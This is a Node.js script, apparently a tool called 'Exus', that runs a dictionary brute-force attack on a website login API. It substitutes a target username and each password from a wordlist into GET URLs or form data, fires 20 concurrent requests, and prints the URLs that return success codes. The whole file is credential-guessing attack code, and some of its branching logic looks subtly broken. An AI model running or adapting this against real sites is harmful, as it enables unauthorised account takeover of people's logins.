"use strict";

// Dependencies
const { ArgumentParser } = require("argparse")
const { runJobs } = require("parallel-park")
const request = require("request-async")
const fs = require("fs")

// Variables
const Exus = {
    methods: ["GET", "POST", "PUT", "PATCH"]
}

const parser = new ArgumentParser()

var args;

// Functions
async function bruteforce(dictionary, urlOnly){
    await runJobs(
        dictionary,
        async(password, index, max)=>{
            if(args.method === "GET"){
                const url = args.url.replace("{{password}}", password)
                var response = await request(url)

                if(response.statusCode === 200 || response.statusCode === 202) console.log(url)
            }else{
                const data = args.data.replace("{{password}}", password)
                var response = await request(args.url, {
                    method: args.method,
                    headers: {
                        "content-type": "application/x-www-form-urlencoded"
                    },
                    data: data
                })

                if(response.statusCode === 200 || response.statusCode === 202) console.log(args.url)
            }
        },
        {
            concurrency: 20
        }
    )
}

// Main
parser.add_argument("-u", "--url", { help: "The target website login API.", required: true })
parser.add_argument("-dt", "--data", { help: "The data to send." })
parser.add_argument("-m", "--method", { help: "Method to use.(Supported: GET, POST, PUT, PATCH)", required: true })
parser.add_argument("-p", "--plugins", { help: "The plugins to use and they are executed in order." })
parser.add_argument("-user", "--username", { help: "The target username.", required: true })
parser.add_argument("-d", "--dictionary", { help: "A file that contains passwords.", required: true })

args = parser.parse_args()

if(Exus.methods.indexOf(args.method) === -1) return console.log("Invalid method.")

const dictionary = fs.readFileSync(args.dictionary, "utf8").replace(/\r/g, "").split("\n")

if(args.data) args.data = args.data.replace("{{username}}", args.username)

if(args.url.match("{{username}}") && !args.data){
    if(args.method === "GET") return console.log("You can only use GET in url bruteforcing.")

    args.url = args.url.replace("{{username}}", args.username)

    bruteforce(dictionary, true)
}else if(!args.url.match("{{username}}")){
    if(!args.data) return console.log("data is required in non GET method.")

    args.data = args.data.replace("{{username}}", args.username)

    bruteforce(dictionary, true)
}else{
    console.log("Please use {{username}} & {{password} correctly. Using both in both data & URL is not allowed.")
}